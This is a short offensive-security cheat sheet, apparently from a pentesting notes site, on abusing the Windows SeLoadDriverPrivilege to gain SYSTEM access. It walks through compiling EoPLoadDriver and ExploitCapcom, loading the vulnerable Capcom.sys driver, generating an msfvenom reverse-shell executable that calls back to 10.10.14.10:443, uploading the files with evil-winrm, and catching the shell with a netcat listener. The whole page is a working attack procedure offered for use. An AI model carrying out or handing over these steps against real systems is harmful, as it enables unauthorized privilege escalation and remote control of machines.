---
title: "SeLoadDriverPrivilege"
date: 2024-7-18
tags: ["SeLoadDriverPrivilege", "privesc", "Windows", "Backup Operators", "diskshadow", "secretsdump"]
---

---
### Abuse #1: Install malicious driver

#### 1. Compile eoploaddriver

<div>

```bash
+---------------------------------------------------------------------------------------+
| 1. Open Visual Studio 2022                                                            |
| 2. Create a new project                                                               |
| 3. Project Template : C++ Console App                                                 |
| 4. Project Name     : Eoploaddriver                                                   |
| 5. Replace code     : eoploaddriver.cpp                                               |
| 6. Remove header    : `include "stdafx.h"`                                            |
| 7. Release -> x64                                                                     |
| 8. Build   -> Build Solution                                                          |
| 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.exe |
+---------------------------------------------------------------------------------------+
```

</div>

<small>*Ref: [eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)*</small>

#### 2. Download Capcom.sys

[Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

#### 3. Compile ExploitCapcom

<div>

```bash
+----------------------------------------------------------------------------------------+
| 1. Double click ExploitCapcom.sln                                                      |
| 2. Replace the payload to `TCHAR CommandLine[] = TEXT("C:\\Windows\\Tasks\\rev.exe");` |
| 3. Release -> x64                                                                      |
| 4. Build   -> Build Solution                                                           |
| 5. Exported to .\x64\Release\ExploitCapcom.exe                                         |
+----------------------------------------------------------------------------------------+
```

</div>

<small>*Ref: [ExploitCapcom](https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom)*</small>

#### 3. Create stageless payload

<div>

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o rev.exe
```

</div>

#### 4. Upload

<div>

```powershell
# For example (evil-winrm)
upload Eoploaddriver.exe C:\ProgramData\Eoploaddriver.exe
```

```powershell
upload Capcom.sys C:\ProgramData\Capcom.sys
```

```powershell
upload ExploitCapcom.exe C:\ProgramData\ExploitCapcom.exe
```

```powershell
upload rev.exe C:\ProgramData\rev.exe
```

</div>

#### 5. Exploit

<div>

```bash
# Start a nc listener
rlwrap nc -lvnp 443
```

```powershell
C:\ProgramData\Eoploaddriver.exe System\CurrentControlSet\test C:\ProgramData\Capcom.sys
```

```powershell
C:\ProgramData\ExploitCapcom.exe
```

</div>

<br>